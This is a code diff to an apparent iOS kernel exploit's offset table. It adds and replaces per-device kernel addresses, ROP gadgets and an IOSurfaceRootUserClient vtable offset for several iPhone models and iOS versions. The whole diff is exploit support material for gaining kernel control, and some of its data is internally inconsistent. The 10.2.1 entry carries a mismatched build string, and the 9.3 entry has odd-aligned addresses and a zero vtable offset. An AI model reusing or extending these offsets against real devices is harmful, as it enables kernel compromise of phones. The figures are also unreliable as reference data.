@@ -39,8 +39,10 @@ BOOL init_symbols()
     uname(&u);
     
     LOG("Device: %s", u.machine);
+    LOG("Device Name: %s", u.version);
     LOG("Device Name: %s", u.nodename);
     LOG("iOS Version: %@", ver);
+    
     
     if (strcmp(u.machine, "iPhone9,3") == 0 && [ver isEqual:@"Version 10.3.1 (Build 14E304)"])
     {
@@ -64,28 +66,75 @@ BOOL init_symbols()
         LOG("loaded offsets for iPhone 7 on 10.3.1");
     }
     
-    // iPhone 6S - 10.3.2
-    else if (strcmp(u.machine, "iPhone8,1") == 0 && [ver isEqual:@"Version 10.3.2 (Build 14F89)"])
+    // iPhone 7 - 10.3.2
+    else if (strcmp(u.machine, "iPhone9,1") == 0 && [ver isEqual:@"Version 10.3.2 (Build 14F89)"])
     {
-        OFFSET_ZONE_MAP                             = 0xfffffff007548478; /* "zone_init: kmem_suballoc failed" */
-        OFFSET_KERNEL_MAP                           = 0xfffffff0075a4050;
-        OFFSET_KERNEL_TASK                          = 0xfffffff0075a4048;
-        OFFSET_REALHOST                             = 0xfffffff00752aba0; /* host_priv_self */
-        OFFSET_BZERO                                = 0xfffffff007081f80;
-        OFFSET_BCOPY                                = 0xfffffff007081dc0;
-        OFFSET_COPYIN                               = 0xfffffff0071806f4;
-        OFFSET_COPYOUT                              = 0xfffffff0071808e8;
-        OFFSET_CHGPROCCNT                           = 0xfffffff007049df1;
-        OFFSET_KAUTH_CRED_REF                       = 0xfffffff007367cf4;
-        OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xfffffff007099e94; /* convert_task_suspension_token_to_port */
-        OFFSET_IPC_KOBJECT_SET                      = 0xfffffff0070ad16c; /* convert_task_suspension_token_to_port */
-        OFFSET_IPC_PORT_MAKE_SEND                   = 0xfffffff0070999b8; /* "ipc_host_init" */
-        OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006e7c9f8;
-        OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff0064b1398;
-        OFFSET_ROP_LDR_X0_X0_0x10                   = 0xfffffff0074c31d4;
-        OFFSET_ROOT_MOUNT_V_NODE                    = 0xfffffff0075a40b0;
-        LOG("loaded offsets for iPhone 6S on 10.3.2");
+        OFFSET_ZONE_MAP                             = 0xfffffff007590478; /* "zone_init: kmem_suballoc failed" */
+        OFFSET_KERNEL_MAP                           = 0xfffffff0075ec050;
+        OFFSET_KERNEL_TASK                          = 0xfffffff0075ec048;
+        OFFSET_REALHOST                             = 0xfffffff007572ba0; /* host_priv_self */
+        OFFSET_BZERO                                = 0xfffffff0070c1f80;
+        OFFSET_BCOPY                                = 0xfffffff0070c1dc0;
+        OFFSET_COPYIN                               = 0xfffffff0071c6108;
+        OFFSET_COPYOUT                              = 0xfffffff0071c63e8;
+        OFFSET_CHGPROCCNT                           = 0xfffffff0073d3994;
+        OFFSET_KAUTH_CRED_REF                       = 0xfffffff0073add44;
+        OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xfffffff0070deff4; /* convert_task_suspension_token_to_port */
+        OFFSET_IPC_KOBJECT_SET                      = 0xfffffff0070f22cc; /* convert_task_suspension_token_to_port */
+        OFFSET_IPC_PORT_MAKE_SEND                   = 0xfffffff0070deb18; /* "ipc_host_init" */
+        OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006e4a238;
+        OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff0063ca398;
+        OFFSET_ROP_LDR_X0_X0_0x10                   = 0xfffffff006314a84;
+        OFFSET_ROOT_MOUNT_V_NODE                    = 0xfffffff0075ec0b0;
+        LOG("loaded offsets for iPhone 7 on 10.3.2");
     }
+    // iPhone 6S - 9.3
+    else if (strcmp(u.machine, "iPhone8,1") == 0 && [ver isEqual:@"Version 9.3 (Build 13E234)"])
+    {
+        OFFSET_ZONE_MAP                             = 0xFFFFFF80044B7499; /* "zone_init: kmem_suballoc failed" */
+        OFFSET_KERNEL_MAP                           = 0xffffff8004536018;
+        OFFSET_KERNEL_TASK                          = 0xffffff8004536010;
+        OFFSET_REALHOST                             = 0xffffff8004593e90; /* host_priv_self */
+        OFFSET_BZERO                                = 0xffffff80040f2a00;
+        OFFSET_BCOPY                                = 0xffffff80040f2840;
+        OFFSET_COPYIN                               = 0xffffff80040f2c2c;
+        OFFSET_COPYOUT                              = 0xffffff80040f2e08;
+        OFFSET_CHGPROCCNT                           = 0xFFFFFF80044A444F;
+        OFFSET_KAUTH_CRED_REF                       = 0xffffff800432ec58;
+        OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xffffff800401fe84; /* convert_task_suspension_token_to_port */
+        OFFSET_IPC_KOBJECT_SET                      = 0xffffff8004030500; /* convert_task_suspension_token_to_port */
+        OFFSET_IPC_PORT_MAKE_SEND                   = 0xffffff800401fb50; /* "ipc_host_init" */
+        OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0x00;
+        OFFSET_ROP_ADD_X0_X0_0x10                   = 0xffffff8004812d60;
+        OFFSET_ROP_LDR_X0_X0_0x10                   = 0xffffff800435f7a0;
+        OFFSET_ROOT_MOUNT_V_NODE                    = 0xffffff8004536070;
+        LOG("loaded offsets for iPhone 6S on 9.3");
+    }
+    
+    // iPhone 6S 10.2.1
+    
+    else if (strcmp(u.machine, "iPhone8,1") == 0 && [ver isEqual:@"Version 10.2.1 (Build 15C153)"])
+    {
+        OFFSET_ZONE_MAP                             = 0xfffffff00709d080; /* "zone_init: kmem_suballoc failed" */
+        OFFSET_KERNEL_MAP                           = 0xfffffff007630050;
+        OFFSET_KERNEL_TASK                          = 0xfffffff007630048;
+        OFFSET_REALHOST                             = 0xfffffff0075c4b98; /* host_priv_self */
+        OFFSET_BZERO                                = 0xfffffff007095fc0;
+        OFFSET_BCOPY                                = 0xfffffff007095e00;
+        OFFSET_COPYIN                               = 0xfffffff0071a4d18;
+        OFFSET_COPYOUT                              = 0xfffffff0071a4f48;
+        OFFSET_CHGPROCCNT                           = 0xfffffff0073e716c;
+        OFFSET_KAUTH_CRED_REF                       = 0xfffffff0073bc46c;
+        OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xfffffff0070b44c8; /* convert_task_suspension_token_to_port */
+        OFFSET_IPC_KOBJECT_SET                      = 0xfffffff0070c9600; /* convert_task_suspension_token_to_port */
+        OFFSET_IPC_PORT_MAKE_SEND                   = 0xfffffff0070b3f54; /* "ipc_host_init" */
+        OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006ee8bc8;
+        OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff00656d1e4;
+        OFFSET_ROP_LDR_X0_X0_0x10                   = 0xfffffff0062cab3c;
+        OFFSET_ROOT_MOUNT_V_NODE                    = 0xfffffff007630088;
+        LOG("loaded offsets for iPhone 6S on 10.2.1");
+    }
+    
     
     else
     {
